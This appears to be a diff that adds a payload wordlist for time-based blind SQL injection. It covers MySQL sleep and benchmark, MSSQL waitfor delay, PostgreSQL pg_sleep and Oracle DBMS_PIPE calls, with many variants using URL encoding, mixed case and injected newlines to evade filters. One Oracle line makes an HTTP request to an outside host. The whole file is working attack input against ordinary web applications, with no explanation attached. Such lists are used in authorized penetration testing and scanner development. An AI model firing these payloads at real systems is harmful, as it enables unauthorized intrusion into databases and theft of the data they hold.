@@ -1,0 +1,83 @@
+sleep(5)%23
+ or sleep(5)%23
+%0aoR%0asLeep(5)%23
+" or sleep(5)%23
+' or sleep(5)%23
+\' or sleep(5)%23
+'oR(SLEEp(5))Or'
+ oR(sleeP(5))
+%2527Or(sLEEP(5))%23
+%df%27OR(sleeP(5))%23
+%2527Or(sLEEP(5))Or%2527
+%df%27OR(sleeP(5))%23
+' And(SLEeP(5))%23
+\' And(SLEeP(5))%23
+' And(SLEeP(5))--%0b
+ AND(SleEP(5))--%0b
+)AND(SleEP(5))%23
+')AND(SleEP(5))%23
+' oR%0asLeep(5)%23
+' oR%0asLeep(5)--%0b
+" or sleep(5)="
+' or sleep(5)='
+) or sleep(5)%23
+") or sleep(5)="
+') or sleep(5)='
+)) or sleep(5)%23
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+;waitfor%0adelay '0:0:5'--
+';waitfor%0adelay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+');waitfor%0adelay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))%23
+ or benchmark(10000000,MD5(1))%23
+%0aor%0abenchmark(10000000,MD5(1))%23
+" or benchmark(10000000,MD5(1))%23
+' or benchmark(10000000,MD5(1))%23
+'%0aoR%0abenchmark(10000000,MD5(1))%23
+ ) or benchmark(10000000,MD5(1))%23
+") or benchmark(10000000,MD5(1))%23
+') or benchmark(10000000,MD5(1))%23
+') or%0abenchmark(10000000,MD5(1))%23
+1)) or benchmark(10000000,MD5(1))%23
+")) or benchmark(10000000,MD5(1))%23
+')) or benchmark(10000000,MD5(1))%23
+pg_sleep(5)--
+ or pg_sleep(5)--
+%0aor%0apg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+' or%0apg_sleep(5)--
+) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+') or%0apg_sleep(5)--
+)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+')) or%0apg_sleep(5)--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(90)||CHR(80)||CHR(71)||CHR(74),5) AND '1'='1
+'%0aAND%0a1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(90)||CHR(80)||CHR(71)||CHR(74),5) AND '1'='1
+')AND%0a1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(90)||CHR(80)||CHR(71)||CHR(74),5) --
+' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(90)||CHR(80)||CHR(71)||CHR(74),5) --
+' OR%0a1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(90)||CHR(80)||CHR(71)||CHR(74),5) --
+') OR%0a1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(90)||CHR(80)||CHR(71)||CHR(74),5) --
+' and (case 1 when 1 then UTL_HTTP.REQUEST('https://google.com') else CHR(1) end)=1 --
+' and (case 1 when 1 then DBMS_PIPE.RECEIVE_MESSAGE(CHR(90)||CHR(80)||CHR(71)||CHR(74),5) else CHR(1) end)=1 AND '1'='1
+'OR (case 1 when 1 then DBMS_PIPE.RECEIVE_MESSAGE(CHR(90)||CHR(80)||CHR(71)||CHR(74),5) else CHR(1) end)=1 --
+ or(sleep(5)) 
+'or(sleep(5))%23
+' or(pg_sleep(5))--
+ or(pg_sleep(5)) 
+ or(benchmark(100000000000,MD5(1)))
+'or(benchmark(100000000000,MD5(1)))%23
+'or(benchmark(100000000000,MD5(1)))-- -
